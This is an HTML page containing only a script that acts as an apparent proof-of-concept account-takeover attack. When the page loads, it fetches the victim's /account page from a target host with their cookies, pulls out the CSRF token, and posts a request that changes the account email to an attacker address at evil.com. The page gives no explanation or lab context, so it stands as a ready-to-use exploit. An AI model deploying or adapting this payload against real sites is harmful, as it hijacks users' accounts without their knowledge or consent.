<html>
<head>
</head>
<body>
<script>
    (async () => {
        const host = "https://172.31.160.1:8000";

        try {
            const getRes = await fetch(`${host}/account`, {
                credentials: 'include'
            });

            const csrfText = await getRes.text();

            const match = csrfText.match(/csrf_token" value="(.+?)">/);
            const csrfToken = match ? match[1] : null;

            if (!csrfToken) {
                throw new Error("CSRF token not found");
            }

            const postRes = await fetch(`${host}/account`, {
                credentials: 'include',
                method: 'POST',
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: new URLSearchParams({
                    email: "rounak2@evil.com",
                    csrf_token: csrfToken
                })
            });

            console.log("done");
        } catch (err) {
            console.log(err.toString());
        }
    })();
</script>
</body>
</html>
